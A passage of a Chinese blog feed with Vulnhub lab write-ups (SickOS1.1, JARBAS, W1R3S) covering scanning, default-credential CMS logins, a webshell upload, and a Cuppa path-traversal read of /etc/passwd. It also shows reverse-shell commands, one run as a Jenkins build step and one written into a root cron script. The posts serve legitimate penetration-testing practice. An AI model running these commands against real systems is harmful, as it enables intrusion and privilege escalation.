    <summary type="html">&lt;h1 id=&quot;0x00-Introduction&quot;&gt;&lt;a href=&quot;#0x00-Introduction&quot; class=&quot;headerlink&quot; title=&quot;0x00 Introduction&quot;&gt;&lt;/a&gt;0x00 Introduction&lt;/h1&gt;&lt;p&gt;作为一个合格的渗透测</summary>
      
    
    
    
    
    <category term="红队技能" scheme="http://example.com/tags/%E7%BA%A2%E9%98%9F%E6%8A%80%E8%83%BD/"/>
    
  </entry>
  
  <entry>
    <title>Vulnhub-SickOS1.1</title>
    <link href="http://example.com/2024/12/28/Vulnhub-SickOS1-1/"/>
    <id>http://example.com/2024/12/28/Vulnhub-SickOS1-1/</id>
    <published>2024-12-28T05:36:29.000Z</published>
    <updated>2024-12-28T15:17:36.019Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-Introduction"><a href="#0x00-Introduction" class="headerlink" title="0x00 Introduction"></a>0x00 Introduction</h1><p>这个靶场考察的主要是代理的相关设置和利用搜索引擎的能力，其它思路和以前的靶场大差不差。</p><p><img src="/../images/Pasted%20image%2020241228230938.png"></p><h1 id="0x01-端口扫描"><a href="#0x01-端口扫描" class="headerlink" title="0x01 端口扫描"></a>0x01 端口扫描</h1><p>首先对所有端口进行 TCP 扫描：</p><figure class="highlight apache"><table><tr><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">sudo</span> nmap -sT --min-rate <span class="hljs-number">10000</span> -p- <span class="hljs-number">192.168.46.141</span> <br></code></pre></td></tr></table></figure><p><img src="/../images/Pasted%20image%2020241228135145.png"></p><p>以后一定记住用这种工具要用 sudo 权限，用和不用扫描结果是不一样的。</p><p>接下来对这 3 个端口详细扫描：</p><figure class="highlight apache"><table><tr><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">sudo</span> nmap -sT -sC -sV -O -p22,<span class="hljs-number">3128</span>,<span class="hljs-number">8080</span> <span class="hljs-number">192.168.46.141</span><br></code></pre></td></tr></table></figure><p><img src="/../images/Pasted%20image%2020241228135700.png"></p><p>可以看到 8080 端口是关闭的，22 端口暂时先不考虑，那么目前的突破口只有 3128 端口。</p><h1 id="0x02-目录爆破-Squid代理设置"><a href="#0x02-目录爆破-Squid代理设置" class="headerlink" title="0x02 目录爆破&amp;Squid代理设置"></a>0x02 目录爆破&amp;Squid代理设置</h1><p>之前从未听说过 Squid，但是根据扫描信息可以知道这是个 http 代理服务，带上版本号谷歌搜索一下看看。 <a href="http://www.squid-cache.org/">官网</a>介绍如下:</p><p><img src="/../images/Pasted%20image%2020241228150732.png"></p><p><img src="/../images/Pasted%20image%2020241228150741.png"></p><p>即使知道这是个代理服务，我也不知道如何利用这个端口。不管如何，目录爆破是一定要做的，这是 Web 渗透的常规手段。</p><figure class="highlight apache"><table><tr><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">sudo</span> gobuster dir -u http://<span class="hljs-number">192.168.46.141</span> -w /usr/share/dirbuster/wordlists/directory-list-<span class="hljs-number">2</span>.<span class="hljs-number">3</span>-medium.txt<br></code></pre></td></tr></table></figure><p><img src="/../images/Pasted%20image%2020241228153203.png"></p><p>ChatGPT 对于这个错误的解答是：目标主机可能设置了防火墙规则，拒绝或丢弃了 Gobuster 发出的 HTTP 请求。</p><p>换个爆破工具试试呢？</p><figure class="highlight 1c"><table><tr><td class="code"><pre><code class="hljs 1c">sudo dirb http<span class="hljs-punctuation">:</span><span class="hljs-comment">//192.168.46.141</span><br></code></pre></td></tr></table></figure><p><img src="/../images/Pasted%20image%2020241228163331.png"></p><p>确实是无法扫描。接下来该从何处入手，涉及到我的知识盲区了，看了红队笔记的视频后，我知道了代理端口原来是这样用的：</p><figure class="highlight apache"><table><tr><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">dirb</span> http://<span class="hljs-number">192.168.46.141</span> -p http://<span class="hljs-number">192.168.46.141:3128</span><br></code></pre></td></tr></table></figure><p>这次有扫描结果了：</p><p><img src="/../images/Pasted%20image%2020241228163456.png"></p><p>接下来逐个分析这些路径。首先我们要给浏览器设置代理：</p><p><img src="/../images/Pasted%20image%2020241228163924.png"></p><h1 id="0x03-Web渗透"><a href="#0x03-Web渗透" class="headerlink" title="0x03 Web渗透"></a>0x03 Web渗透</h1><p>访问 <a href="http://192.168.46.141/">http://192.168.46.141</a> :</p><p><img src="/../images/Pasted%20image%2020241228164022.png"></p><p>查看网页源代码，没发现什么有用信息。</p><p>访问 <a href="http://192.168.46.141/connect">http://192.168.46.141/connect</a> ：</p><p><img src="/../images/Pasted%20image%2020241228164605.png"></p><p>&#x2F;index 和 &#x2F;index.php 都是刚才的 BLEHHH!!! 页面。</p><p>再看 &#x2F;robots 和 &#x2F;robots.txt：</p><p><img src="/../images/Pasted%20image%2020241228165007.png"></p><p>这里暴露了个路径<code>/wolfcms</code>：</p><p><img src="/../images/Pasted%20image%2020241228165211.png"></p><p>可以看到 Wolf CMS 的前端页面，但是没看到有登录的入口，我们要想办法登录到后台，才能找到漏洞利用点。</p><p>谷歌搜索 Wolf CMS ，看到它是开源的，代码审计试试。</p><p><img src="/../images/Pasted%20image%2020241228173409.png"></p><p>太复杂了，没找到突破口。</p><p>学习红笔思路，直接谷歌搜索 <code>wolf cms admin path</code>:</p><p><img src="/../images/Pasted%20image%2020241228174135.png"></p><p>访问 <a href="http://192.168.46.141/wolfcms/?/admin">http://192.168.46.141/wolfcms/?/admin</a></p><p><img src="/../images/Pasted%20image%2020241228174246.png"></p><p>由于当前还未获取到任何用户信息，所以遇到这个登录页面的思路，要么是弱密码，要么就是暴力破解。</p><p>对弱密码的尝试是渗透测试人员需要具备的素质。比如一些新建的网站，一般来说不会有太复杂的密码，或者根本没有修改默认密码，说不定就运气好登录成功了呢。</p><p>这里登录的用户名和密码都是 admin。登录后页面如下：</p><p><img src="/../images/Pasted%20image%2020241228175140.png"></p><p>逐项探索，发现有很多代码执行和文件上传的地方：</p><p><img src="/../images/Pasted%20image%2020241228175346.png"></p><p><img src="/../images/Pasted%20image%2020241228175420.png"></p><p>首先试试上传个 webshell：</p><p><img src="/../images/Pasted%20image%2020241228180340.png"></p><p>上传成功了，哥斯拉连接当前 URL 试试：</p><p><img src="/../images/Pasted%20image%2020241228181452.png"></p><p>失败了。这里犯了个致命错误，当前 URL 并不是后门文件的实际位置，只是一个编辑页面：</p><p><img src="/../images/Pasted%20image%2020241228192949.png"></p><p>而且已经给提示了在<code>public</code>目录下，以后再上传后门文件一定要试试能不能访问到！</p><p>此时有个疑问，shell.php 明明没有执行权限，为什么能够被解析，大佬解答是这样的：</p><p><img src="/../images/3f501fa523f70561512df7ee3a6f7f80.png"></p><p>将 URL 改为正确路径 <a href="http://192.168.46.141/wolfcms/public/shell.php">http://192.168.46.141/wolfcms/public/shell.php</a> 后，上传 webshell 成功。</p><h1 id="0x04-ssh登录及提权"><a href="#0x04-ssh登录及提权" class="headerlink" title="0x04 ssh登录及提权"></a>0x04 ssh登录及提权</h1><p>首先查看一些基本信息：</p><p><img src="/../images/Pasted%20image%2020241228195448.png"></p><p>当前用户是 www-data，主机名是 SickOs，没有 sudo 权限。</p><p>查看当前目录下的文件：</p><p><img src="/../images/Pasted%20image%2020241228195646.png"></p><p>先从最感兴趣的 config.php 看起。发现了数据库配置：</p><p><img src="/../images/Pasted%20image%2020241228195834.png"></p><p>数据库用户名是 root，但是这个密码不一定是主机 root 身份的密码。无论如何这个密码都是有用的。</p><p>其它文件没什么信息。接下来查看 <code>/etc/passwd</code>:</p><p><img src="/../images/Pasted%20image%2020241228201145.png"></p><p>这里值得关注的只有 UID 为 0 的 root 用户和 UID 为 1000 的普通用户 sickos。</p><p>查看 <code>/etc/shadow</code>:</p><p><img src="/../images/Pasted%20image%2020241228201354.png"></p><p>没有权限。但我们刚才已经获得了一个密码，试试 ssh 登录：</p><figure class="highlight nginx"><table><tr><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">ssh</span> sickos@<span class="hljs-number">192.168.46.141</span><br></code></pre></td></tr></table></figure><p>登录成功，查看当前账号的 sudo 权限：</p><p><img src="/../images/Pasted%20image%2020241228201752.png"></p><p>发现是 3 个 ALL，那么直接执行 <code>sudo /bin/bash</code> 即可获取 root 权限，拿到 flag:</p><p><img src="/../images/Pasted%20image%2020241228202117.png"></p><h1 id="0x05-Conclusion"><a href="#0x05-Conclusion" class="headerlink" title="0x05 Conclusion"></a>0x05 Conclusion</h1><p>这个靶场难度也不大，但过程中也出现了很多问题，归根结底还是理解得不够深，而且信息搜集能力有待加强。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;0x00-Introduction&quot;&gt;&lt;a href=&quot;#0x00-Introduction&quot; class=&quot;headerlink&quot; title=&quot;0x00 Introduction&quot;&gt;&lt;/a&gt;0x00 Introduction&lt;/h1&gt;&lt;p&gt;这个靶场考察的主要是</summary>
      
    
    
    
    
    <category term="Vulnhub" scheme="http://example.com/tags/Vulnhub/"/>
    
  </entry>
  
  <entry>
    <title>Vulnhub-JARBAS</title>
    <link href="http://example.com/2024/12/27/Vulnhub-JARBAS/"/>
    <id>http://example.com/2024/12/27/Vulnhub-JARBAS/</id>
    <published>2024-12-27T08:16:10.000Z</published>
    <updated>2024-12-27T12:59:21.057Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-Introduction"><a href="#0x00-Introduction" class="headerlink" title="0x00 Introduction"></a>0x00 Introduction</h1><p>这个靶场的考察点主要是 Jenkins 的漏洞利用和 crontab 计划任务提权。打靶思路见下图。</p><p><img src="/../images/Pasted%20image%2020241227204804.png"></p><h1 id="0x01-端口扫描"><a href="#0x01-端口扫描" class="headerlink" title="0x01 端口扫描"></a>0x01 端口扫描</h1><p>首先对所有端口进行 TCP 扫描：</p><figure class="highlight apache"><table><tr><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">sudo</span> nmap -sT --min-rate <span class="hljs-number">10000</span> -p- <span class="hljs-number">192.168.46.140</span><br></code></pre></td></tr></table></figure><p><img src="/../images/Pasted%20image%2020241227163858.png"></p><p>接下来对这个四个端口进行详细信息扫描:</p><figure class="highlight apache"><table><tr><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">sudo</span> nmap -sT -sC -sV -p22,<span class="hljs-number">80</span>,<span class="hljs-number">3306</span>,<span class="hljs-number">8080</span> <span class="hljs-number">192.168.46.140</span><br></code></pre></td></tr></table></figure><p><img src="/../images/Pasted%20image%2020241227164331.png"></p><p>对这四个端口的探索及利用排个优先级：80&gt;8080&gt;22&gt;3306。</p><h1 id="0x02-Web渗透"><a href="#0x02-Web渗透" class="headerlink" title="0x02 Web渗透"></a>0x02 Web渗透</h1><p>浏览器访问 <a href="http://192.168.46.140/">http://192.168.46.140</a> :</p><p><img src="/../images/Pasted%20image%2020241227170906.png"></p><p>探索了一下，没发现什么可以利用的点，接下来目录爆破：</p><figure class="highlight apache"><table><tr><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">gobuster</span> dir -u http://<span class="hljs-number">192.168.46.140</span> --wordlist /usr/share/dirbuster/wordlists/directory-list-<span class="hljs-number">2</span>.<span class="hljs-number">3</span>-medium.txt<br></code></pre></td></tr></table></figure><p>没有爆破到任何信息：</p><p><img src="/../images/Pasted%20image%2020241227175216.png"></p><p>那么限制扩展名试试？根据 Wappalyzer 的分析结果得知后端语言是 PHP，那我们限制扩展名是 php 和 html 试试：</p><figure class="highlight apache"><table><tr><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">gobuster</span> dir -u http://<span class="hljs-number">192.168.46.140</span> --wordlist /usr/share/dirbuster/wordlists/directory-list-<span class="hljs-number">2</span>.<span class="hljs-number">3</span>-medium.txt -x php,html<br></code></pre></td></tr></table></figure><p>这次爆出有用信息了：</p><p><img src="/../images/Pasted%20image%2020241227175546.png"></p><p>访问 <a href="http://192.168.46.140/access.html">http://192.168.46.140/access.html</a> :</p><p><img src="/../images/Pasted%20image%2020241227175854.png"></p><p>利用 <code>hash-identifier</code>识别一下这是什么加密方式：</p><p><img src="/../images/Pasted%20image%2020241227180622.png"></p><p>找一个 MD5 解密网站，解密结果是：</p><figure class="highlight avrasm"><table><tr><td class="code"><pre><code class="hljs avrasm"><span class="hljs-symbol">tiago:</span> italia99<br><span class="hljs-symbol">trindade:</span> marianna<br><span class="hljs-symbol">eder:</span> vipsu<br></code></pre></td></tr></table></figure><p>一看就是账号密码，ssh 登录试试。</p><p>很遗憾失败了。</p><p>接下来探索 8080 端口，访问 <a href="http://192.168.46.140:8080/">http://192.168.46.140:8080</a> ：</p><p><img src="/../images/Pasted%20image%2020241227181527.png"></p><p>正好是个登录界面，用第三个账号密码登录成功了：</p><p><img src="/../images/Pasted%20image%2020241227181703.png"></p><h1 id="0x03-Jenkins漏洞利用"><a href="#0x03-Jenkins漏洞利用" class="headerlink" title="0x03 Jenkins漏洞利用"></a>0x03 Jenkins漏洞利用</h1><p>看大佬视频才知道 Jenkins 是一个比较出名的工具，用于持续集成（CI）和持续交付（CD），简化软件开发中的构建、测试和部署过程。</p><p>既然如此，用 <code>searchsploit</code> 搜索相关的漏洞及其利用</p><p><img src="/../images/Pasted%20image%2020241227183436.png"></p><p>有这么多公开漏洞，一个一个试不太现实。红队笔记说他对 Jenkins 非常熟悉，因此对漏洞触发的点也非常清楚。我们直接跟着他的思路走，下次再遇到 Jenkins ，直接尝试这个 EXP ，如果不行再尝试其它漏洞。</p><p>新建个项目，项目类型选择第一个：</p><p><img src="/../images/Pasted%20image%2020241227185420.png"></p><p>Build 这栏执行命令的选项。前面信息收集是，我们已经知道了目标主机是 Linux 操作系统，所以选择第二个 <code>Execute shell</code> 。</p><p><img src="/../images/Pasted%20image%2020241227185652.png"></p><p>然后就可以执行反弹 shell 了，本机开启一个 888 监听端口：</p><figure class="highlight apache"><table><tr><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">nc</span> -lvp <span class="hljs-number">888</span><br></code></pre></td></tr></table></figure><p>生成个命令，复制到输入框里:</p><p><img src="/../images/Pasted%20image%2020241227190255.png"></p><p>save，然后点击 Build Now：<br><img src="/../images/Pasted%20image%2020241227190554.png"></p><p>最后发现错误原因是上面生成的命令中 <code>/888</code> 前面多了个空格，输入正确命令</p><figure class="highlight apache"><table><tr><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">bash</span> -i &gt;&amp; /dev/tcp/<span class="hljs-number">192.168.46.131</span>/<span class="hljs-number">888</span> <span class="hljs-number">0</span>&gt;&amp;<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>执行反弹 shell 成功：</p><p><img src="/../images/Pasted%20image%2020241227194127.png"></p><p>当前 shell 不是一个完全交互式的 shell，我们尝试用之前学到的命令升级一下，python 命令成功了：</p><figure class="highlight ada"><table><tr><td class="code"><pre><code class="hljs ada">python -c <span class="hljs-symbol">&#x27;import</span> pty; pty.spawn(<span class="hljs-string">&quot;/bin/bash&quot;</span>)&#x27;<br></code></pre></td></tr></table></figure><h1 id="0x04-提权"><a href="#0x04-提权" class="headerlink" title="0x04 提权"></a>0x04 提权</h1><p>查看相关信息：</p><p><img src="/../images/Pasted%20image%2020241227195647.png"></p><p>查看 <code>/etc/passwd</code>:</p><p><img src="/../images/Pasted%20image%2020241227200618.png"></p><p>可以看到 root 和 eder 是可以使用 bash 的，当前用户不可以使用 bash。</p><p>接下来看<code>/etc/shadow</code>：</p><p><img src="/../images/Pasted%20image%2020241227200814.png"></p><p>很遗憾，没有权限。</p><p>那么就得想其它办法提权了。之前写过一篇权限提升的博客，这里用到的是 Cron 计划任务。</p><p>查看当前服务器的定时任务：</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> /etc/crontab<br></code></pre></td></tr></table></figure><p>每 5 分钟就会以 root 权限运行 &#x2F;etc&#x2F;script&#x2F;CleaningScript.sh：</p><p><img src="/../images/Pasted%20image%2020241227201754.png"></p><p>查看一下这个文件有没有写权限：</p><p><img src="/../images/Pasted%20image%2020241227202026.png"></p><p>太好了，有写权限，那么我们就可以写入反弹 shell 命令，获取 root 身份的 shell 了。</p><p>本机再开启一个 1234 监听端口，当前 shell 输入以下命令：</p><figure class="highlight autohotkey"><table><tr><td class="code"><pre><code class="hljs autohotkey">echo <span class="hljs-string">&quot;bash -i &gt;&amp; /dev/tcp/192.168.46.131/1234 0&gt;&amp;1&quot;</span> &gt; /etc/script/CleaningScript.sh<br>// `&gt;`：覆盖写入<br>// `&gt;&gt;`：追加写入<br></code></pre></td></tr></table></figure><p>最多等待 5 分钟，就能成功提权：</p><p><img src="/../images/Pasted%20image%2020241227203022.png"></p><p>获取 flag:</p><p><img src="/../images/Pasted%20image%2020241227203054.png"></p><h1 id="0x05-Conclusion"><a href="#0x05-Conclusion" class="headerlink" title="0x05 Conclusion"></a>0x05 Conclusion</h1><p>这个靶场总体来说不算难，不但巩固了以前学过的知识，也给了我一些启发。比如目录爆破的时候，不带参数扫描不出来结果，如果卡在这里就完全走不下去了。因此以后在做目录爆破的时候，如果一次扫不出结果，可以限定后缀名，或者使用其它工具试试。整个打靶过程，还是比较考验知识储备的，比如我之前根本没听说过 Jenkins ，不过以后再遇到就有思路了。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;0x00-Introduction&quot;&gt;&lt;a href=&quot;#0x00-Introduction&quot; class=&quot;headerlink&quot; title=&quot;0x00 Introduction&quot;&gt;&lt;/a&gt;0x00 Introduction&lt;/h1&gt;&lt;p&gt;这个靶场的考察点主要</summary>
      
    
    
    
    
    <category term="Vulnhub" scheme="http://example.com/tags/Vulnhub/"/>
    
  </entry>
  
  <entry>
    <title>Vulnhub-W1R3S 1.0.1 &amp; 详述渗透测试思路</title>
    <link href="http://example.com/2024/12/26/Vulnhub-W1R3S-1-0-1-%E8%AF%A6%E8%BF%B0%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%80%9D%E8%B7%AF/"/>
    <id>http://example.com/2024/12/26/Vulnhub-W1R3S-1-0-1-%E8%AF%A6%E8%BF%B0%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%80%9D%E8%B7%AF/</id>
    <published>2024-12-26T06:20:44.000Z</published>
    <updated>2024-12-27T08:36:19.339Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-Introduction"><a href="#0x00-Introduction" class="headerlink" title="0x00 Introduction"></a>0x00 Introduction</h1><p>偶然在 b 站上发现个大佬：红队笔记，第一个视频就是讲解的 Vulnhub-W1R3S 靶场。听完之后，不禁感慨，这绝对是我到目前为止看过的最好的教学视频，全程干货，一点废话都没有，而且逻辑清晰，细节满满。于是跟着打了这个靶场，感觉豁然开朗，记录下来以便日后复习。</p><p><img src="/../images/Pasted%20image%2020241227160050.png"></p><h1 id="0x01-nmap-扫描与分析"><a href="#0x01-nmap-扫描与分析" class="headerlink" title="0x01 nmap 扫描与分析"></a>0x01 nmap 扫描与分析</h1><p>首先扫描靶机所在网段：</p><figure class="highlight armasm"><table><tr><td class="code"><pre><code class="hljs armasm"><span class="hljs-symbol">sudo</span> nmap -<span class="hljs-meta">sn</span> <span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">46</span>.<span class="hljs-number">0</span>/<span class="hljs-number">24</span>   <br><span class="hljs-comment">// 扫描模式为主机发现（Ping 扫描）。不进行端口扫描，只检查主机是否在线。</span><br></code></pre></td></tr></table></figure><blockquote><ul><li>渗透过程中要养成使用普通用户的习惯，特定操作需要 root 权限时再利用 sudo 提升权限，避免误操作或者给恶意代码和反杀留下机会。</li><li>遇到一些莫名奇妙的问题时，要想到是不是没给 sudo 权限导致的。</li></ul></blockquote><p>根据靶机上线前后 nmap 扫描结果的变化，确认靶机 ip 地址:</p><p><img src="/../images/Pasted%20image%2020241226151054.png"></p><p>接下来对这个 ip 进行<strong>端口扫描</strong>：</p><figure class="highlight arcade"><table><tr><td class="code"><pre><code class="hljs arcade">sudo nmap -sT --<span class="hljs-built_in">min</span>-rate <span class="hljs-number">10000</span> -p- <span class="hljs-number">192.168</span><span class="hljs-number">.46</span><span class="hljs-number">.139</span><br><span class="hljs-comment">// -sT 表示进行TCP扫描，准确率更高。</span><br><span class="hljs-comment">// 经验表明 10000 就是合适的扫描速度。</span><br><span class="hljs-comment">// -p- 表示对所有端口（1-65535）进行扫描。</span><br></code></pre></td></tr></table></figure><p><img src="/../images/Pasted%20image%2020241226152420.png"></p><p>扫描结果表明，开放了 21, 22, 80, 3306 这四个端口，接下来进行这几个端口的<strong>详细信息扫描</strong>。这一步很重要，可以确定攻击面和渗透的优先级。</p><figure class="highlight stata"><table><tr><td class="code"><pre><code class="hljs stata">sudo nmap -<span class="hljs-keyword">sT</span> -sV -<span class="hljs-keyword">sC</span> -O -p21,22,80,3306 192.168.46.139<br><span class="hljs-comment">// -sV 表示探测开放服务的版本。</span><br><span class="hljs-comment">// -sC 使用默认的脚本。</span><br><span class="hljs-comment">// -O 表示探测操作系统版本。</span><br><span class="hljs-comment">// -p 表示待扫描的端口</span><br></code></pre></td></tr></table></figure><blockquote><ul><li>精确地使用参数，分阶段地扫描，会大大提升 nmap 的扫描效率和隐蔽性。</li></ul></blockquote><p><img src="/../images/Pasted%20image%2020241226153901.png"></p><p>分析以上扫描结果：</p><ol><li>21 是 ftp 文件传输协议的端口，有可能存在匿名登录和信息泄露。</li><li>22 是 ssh 远程登录端口，一般优先级排后。</li><li>80 是 http 协议端口，是最有可能的突破口。</li><li>3306 是 MySQL 默认端口，可能存在弱密码，或者配合渗透测试其它环节完成利用。</li></ol><p>紧接着进行 <strong>UDP 扫描</strong>。虽然 UDP 端口暴露的攻击面比较小，但在信息搜集阶段就应该搜集得越全面越好。当 TCP 端口没有找到突破口的时候，说不定 UDP 也是一条路。</p><figure class="highlight jboss-cli"><table><tr><td class="code"><pre><code class="hljs jboss-cli">sudo nmap -sU <span class="hljs-params">--top-ports</span> 20 192.168.46.139<br><span class="hljs-string">//</span> 仅检查前 20 个最常用的 UDP 端口。<br></code></pre></td></tr></table></figure><p>发现这 20 个端口的状态都是开放&#x2F;被过滤状态，没有明确开放的：</p><p><img src="/../images/Pasted%20image%2020241226162116.png"></p><p>然后我们再使用 nmap 中自带的脚本 vuln 进行<strong>漏洞脚本扫描</strong>。</p><figure class="highlight apache"><table><tr><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">sudo</span> nmap -script=vuln -p21,<span class="hljs-number">22</span>,<span class="hljs-number">80</span>,<span class="hljs-number">3306</span> <span class="hljs-number">192.168.46.139</span><br></code></pre></td></tr></table></figure><p><img src="/../images/Pasted%20image%2020241226164026.png"></p><p>发现一个 DOS 攻击漏洞，但是一般不会利用这个漏洞，可以忽略。同时还发现了一个 CMS 为Wordpress 的登录页面。</p><p>虽然 UDP 扫描和漏洞脚本扫描对于这台靶机没有扫描出什么有用信息，但是在信息收集阶段值得尝试。</p><h1 id="0x02-FTP渗透"><a href="#0x02-FTP渗透" class="headerlink" title="0x02 FTP渗透"></a>0x02 FTP渗透</h1><p>扫描结果表明，ftp 可以匿名登录，用户名输入 anonymous，密码为空：</p><p><img src="/../images/Pasted%20image%2020241226165253.png"></p><p>提示用二进制模式传输文件，所以这里要养成一个习惯，进入 ftp 后首先输入<code>binary</code>切换到二进制模式，否则下载的可执行文件可能是损坏的。</p><p>发现三个目录：</p><p><img src="/../images/Pasted%20image%2020241226165815.png"></p><p>首先进入 content 目录，发现三个 .txt 文件:</p><p><img src="/../images/Pasted%20image%2020241226165956.png"></p><p>使用以下命令直接一次性下载多个文件：</p><figure class="highlight nginx"><table><tr><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">mget</span> <span class="hljs-regexp">*.txt</span><br></code></pre></td></tr></table></figure><p>但是每下载一个文件，就需要一个交互式的操作：</p><p><img src="/../images/Pasted%20image%2020241226170327.png"></p><p>如果下载的文件很多的话，就会很麻烦。这里可以输入 <code>prompt</code> 关闭交互模式。</p><p>相同操作把其它两个目录的文件也下载下来，并查看。</p><p>01.txt:</p><p><img src="/../images/Pasted%20image%2020241226172350.png"></p><p>没什么有用信息，但是也有所收获。之前一直疑惑为什么总看到类似 W1R3S 的写法，现在知道了这种形式叫做 leetspeak，最初是用来解决用户名重复的问题的。对于渗透测试人员，看到 new 这个词，就知道它可能建设得还不完善，此时应该更有信心了。</p><p>02.txt:</p><p><img src="/../images/Pasted%20image%2020241226173157.png"></p><p>这是两段加密文本。Kali 中自带一个 hash-identifier：</p><p><img src="/../images/Pasted%20image%2020241226173709.png"></p><p>识别出这是 MD5 加密。找个在线网站解密：</p><p><img src="/../images/Pasted%20image%2020241226173921.png"></p><p>看下一个密文，根据经验判断这是 base64 加密：base64 的字符组成包括 <code>0-9</code>, <code>a-z</code>, <code>A-Z</code>, <code>+</code>, <code>/</code> ,<code>=</code>。<code>=</code>只在文末出现，最多2个，起补位作用。</p><p>kali 中直接进行 base64 解密：</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;SXQgaXMgZWFzeSwgYnV0IG5vdCB0aGF0IGVhc3kuLg==&#x27;</span> | <span class="hljs-built_in">base64</span> -d<br></code></pre></td></tr></table></figure><p><img src="/../images/Pasted%20image%2020241226174914.png"></p><p>03.txt:</p><p><img src="/../images/Pasted%20image%2020241226175108.png"></p><p>搜索 ASCII Art Generator ，即可生成这种形式的文字：</p><p><img src="/../images/Pasted%20image%2020241226175715.png"></p><p>emploee-names.txt:</p><p><img src="/../images/Pasted%20image%2020241226180231.png"></p><p>看到这些信息，要基于角色去思考这些人的账号权限有什么，能看到什么信息，这也是渗透测试的重要思路。比方说经理的权限说不定会很高，网页设计者可能在 web 开发中有一些自己的习惯，HR是我们社工的主要对象等等。</p><p>worktodo.txt：</p><p><img src="/../images/Pasted%20image%2020241226180005.png"></p><p>I don’t think this is the way to root；we have a lot of work to do, stop playing around…</p><p>FTP 能看到的就这么多了。</p><h1 id="0x03-Web渗透"><a href="#0x03-Web渗透" class="headerlink" title="0x03 Web渗透"></a>0x03 Web渗透</h1><p>浏览器访问 <a href="http://192.168.46.139/">http://192.168.46.139</a>:</p><p><img src="/../images/Pasted%20image%2020241226181456.png"></p><p>是 Apache 的默认页，没什么价值，但现实中不排除存在一些信息泄露。</p><p>接下来进行<strong>目录爆破</strong>：</p><figure class="highlight apache"><table><tr><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">sudo</span> gobuster dir -u http://<span class="hljs-number">192.168.46.139</span> --wordlist /usr/share/dirbuster/wordlists/directory-list-<span class="hljs-number">2</span>.<span class="hljs-number">3</span>-medium.txt<br></code></pre></td></tr></table></figure><p><img src="/../images/Pasted%20image%2020241226182939.png"></p><p>挨个试试。首先访问 <a href="http://192.168.46.139/wordpress">http://192.168.46.139/wordpress</a> ，发现网页自动跳转到 localhost:</p><p><img src="/../images/Pasted%20image%2020241226183142.png"></p><p>在之前的靶场练习中，我们学过在<code>/etc/hosts</code>文件中手动添加域名和 ip 地址的映射关系，这里也这样操作。但是手动添加映射后，访问 localhost 依然无法连接。我们再添加一个 <code>xxshh.com</code>指向靶机地址以做验证，发现访问成功。原因是 kali 不允许 localhost 指向非本机 ip。目前这条路走不通了。</p><h1 id="0x04-CMS渗透"><a href="#0x04-CMS渗透" class="headerlink" title="0x04 CMS渗透"></a>0x04 CMS渗透</h1><p>访问 <a href="http://192.168.46.139/administrator">http://192.168.46.139/administrator</a> :</p><p><img src="/../images/Pasted%20image%2020241226191307.png"></p><p>是一个 CMS 安装页面，而且暴露了该 CMS 是 Cuppa。整个页面只有一个 next 按钮可以点。这里要有一个心理预期，要思考下一步操作会不会对服务器做不可逆的修改或者被管理员发现，谨慎操作。</p><p>点击 next，看到一个安装的配置页面：</p><p><img src="/../images/Pasted%20image%2020241226204243.png"></p><p>发现一个错误拼写，这在实战中是可以利用的：</p><p><img src="/../images/Pasted%20image%2020241226204521.png"></p><p>因为这种错误具有独特性，实战中在纠结是否进行下一步时，通过搜索这个错误拼写可能找到类似的场景，就会知道下一步操作会带来什么结果。</p><p>填写信息后点击 next:</p><p><img src="/../images/Pasted%20image%2020241226205139.png"></p><p>安装失败，此时已经没有其它可用信息了。但是所幸我们已经知道这个 CMS 是 Cuppa 了，接下来的思路就是搜索 Cuppa 是否有公开漏洞可以利用。</p><p><code>searchsploit</code> 是一个命令行工具，用于快速搜索 Exploit Database (<a href="https://www.exploit-db.com/">https://www.exploit-db.com/</a>) 中的漏洞和利用代码。</p><figure class="highlight ebnf"><table><tr><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">searchsploit cuppa</span> <br></code></pre></td></tr></table></figure><p><img src="/../images/Pasted%20image%2020241226210239.png"></p><p>发现有一个远程文件包含漏洞，我们把这个 25971.txt 下载下来看看怎么利用 ：</p><figure class="highlight nginx"><table><tr><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">searchsploit</span> cuppa -m <span class="hljs-number">25971</span>.txt  <span class="hljs-comment"># m:mirror</span><br></code></pre></td></tr></table></figure><p><img src="/../images/Pasted%20image%2020241226210558.png"></p><p>查看这个文件，仔细阅读漏洞相关信息及利用：</p><p><img src="/../images/Pasted%20image%2020241226211707.png"></p><p>首先尝试本地文件包含：</p><figure class="highlight awk"><table><tr><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">46.139</span><span class="hljs-regexp">/cuppa/</span>alerts<span class="hljs-regexp">/alertConfigField.php?urlConfig=../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>etc/passwd<br></code></pre></td></tr></table></figure><p>发现路径不对：</p><p><img 